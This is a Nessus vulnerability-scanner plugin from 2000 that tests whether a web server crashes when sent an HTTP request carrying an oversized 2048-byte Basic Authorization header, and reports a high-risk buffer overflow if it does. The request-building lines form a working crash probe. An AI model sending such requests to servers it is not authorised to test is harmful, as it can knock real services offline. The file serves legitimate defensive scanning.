#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      This is more of a generic test script.  One vulnerable server is AOL 3.0
#      http://online.securityfocus.com/archive/1/209681

if(description)
{
 script_id(10515);
 script_version ("$Revision: 1.15 $");
 
 name["english"] = "Too long authorization";
 name["francais"] = "autorisation trop longue";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It may be possible to make the web server execute
arbitrary code or crash by sending it an authorization
string which is too long.

Risk factor : High

Solution : Upgrade your web server.";

 desc["francais"] = "
 
Il est peut etre possible de faire executer du code arbitraire
ou de faire planter le serveur web en lui envoyant une 
autorisation d'authentification trop longue.

Facteur de risque : Elevé

Solution : Mettez à jour votre serveur web.";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Web server buffer overflow";
 summary["francais"] = "Dépassement de buffer dans un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/www",80);
 exit(0);
}



include("http_func.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

soc = http_open_socket(port);
if(soc)
  {
   if (http_is_dead(port: port))exit(0);
   soc = http_open_socket(port);
   req = http_get(item:"/", port:port);
   req = req - string("\r\n\r\n");
   
   req = req + string(
           "\nAuthorization: Basic ", crap(2048), "\r\n\r\n");

   send(socket:soc, data:req);
   r = http_recv(socket:soc);
   http_close_socket(soc);
   if (http_is_dead(port: port)) security_hole(port);
}

